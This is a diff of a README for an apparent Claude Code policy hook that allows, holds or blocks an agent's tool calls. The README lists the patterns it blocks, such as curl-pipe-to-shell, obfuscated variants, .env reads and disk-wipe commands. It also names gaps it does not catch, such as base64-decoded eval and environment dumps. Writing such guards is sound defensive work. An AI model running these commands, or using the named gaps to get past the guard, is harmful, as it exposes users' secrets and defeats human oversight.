@@ -2,8 +2,8 @@
 
 A policy hook for Claude Code. Every `Bash` / `Edit` / `Read` / `WebFetch` / MCP
 call is checked before it runs and is **allowed**, **held for approval**, or
-**blocked** — each with a reason and a local receipt. Pure stdlib, no
-dependencies, no account.
+**blocked** — each with a reason and a local receipt. Zero dependencies, no
+account.
 
 <p align="center">
   <img src="assets/demo.gif" alt="certior-guard demo: Claude Code tries to read .env and curl|bash — blocked; terraform apply and git push — held for approval; edit code and run tests — allowed" width="740">
@@ -11,31 +11,32 @@ dependencies, no account.
 
 ## Install
 
-**Terminal (pip):**
-
-```bash
-pip install certior-guard
-certior-guard init          # scans the repo, picks a profile, wires the hook
-```
-
-**Claude Code plugin:**
+**Claude Code plugin (no install step — runs on Node, which you already have):**
 
 ```
 /plugin marketplace add certior/certior-guard
 /plugin install certior-guard@certior
 ```
 
-The plugin is self-contained (no pip step) and applies `team` / `ask` defaults
-immediately. Requires `python3` 3.11+ on `PATH`; if it is missing the hook fails
-open (allows everything) and warns at session start.
+The plugin is self-contained and applies `team` / `ask` defaults immediately.
 
-`init` writes three files:
+**Terminal (npm):**
+
+```bash
+npm install -g certior-guard   # or: npx certior-guard init
+certior-guard init             # scans the repo, picks a profile, wires the hook
+```
+
+`init` writes three things:
 
 ```
 certior.yml               # your profile + mode — edit any time, no restart
-.claude/settings.json     # the PreToolUse hook (plugin wires its own)
-.certior/audit/           # one JSONL receipt per decision
+.claude/settings.json      # the PreToolUse hook (the plugin wires its own)
+.certior/audit/            # one JSONL receipt per decision
 ```
+
+Requires Node 18+. If Node is somehow missing the hook fails open (allows
+everything) and warns at session start.
 
 ## Configuration
 
@@ -66,8 +67,8 @@ mode: ask        # observe | ask | enforce
 Across every profile: reading secrets, disk wipes (`dd`, `mkfs`, `shred`),
 `curl … | bash`, and data exfiltration are always blocked. `git push`, deploys
 (`terraform` / `kubectl` / `vercel`), migrations, `rm -rf`, package publishes,
-and edits to auth/billing/CI files are held for approval. Reading source and
-editing app code, tests, and local branches are allowed.
+dependency installs, and edits to auth/billing/CI files are held for approval.
+Reading source and editing app code, tests, and local branches are allowed.
 
 ## Commands
 
@@ -88,25 +89,18 @@ Shell rules run against a parsed normal form, not the raw string, so obfuscated
 variants resolve to the same decision — `c""url http://x | sh`,
 `/usr/bin/curl … | sh`, `FOO=bar curl … | sh`, and `sudo curl … | sh` are all
 blocked, as are secret reads via `source .env`, `cp .env /tmp/x`, or
-`python -c "open('.env').read()"`. Committed templates (`.env.example`,
+`node -e "readFileSync('.env')"`. Committed templates (`.env.example`,
 `.env.sample`) are not treated as secrets.
 
 It is a policy boundary, not a sandbox. It does not catch reads performed inside
-a program (`python app.py` that itself opens `.env`), environment dumps
+a program (`node app.js` that itself opens `.env`), environment dumps
 (`env` / `printenv`), or encoded/dynamic commands (`eval "$(… | base64 -d)"`).
 
 ## Receipts
 
-Each decision appends one line to `.certior/audit/YYYY-MM-DD.jsonl`:
-
-```json
-{"tool":"Read","target":".env","decision":"deny","capability":"secrets:read",
- "reason":"secrets are never readable by an agent","profile":"team","mode":"ask",
- "policy_hash":"sha256:…","timestamp":"2026-07-03T21:04:12Z","verifier":"certior-guard"}
-```
-
-Local, grep-able, no cloud. The log is a **hash chain** — each receipt carries the
-previous one's hash — so editing or deleting any past decision is detectable:
+Each decision appends one line to `.certior/audit/YYYY-MM-DD.jsonl`. The log is a
+**hash chain** — each receipt carries the previous one's hash — so editing or
+deleting any past decision is detectable:
 
 ```bash
 certior-guard verify
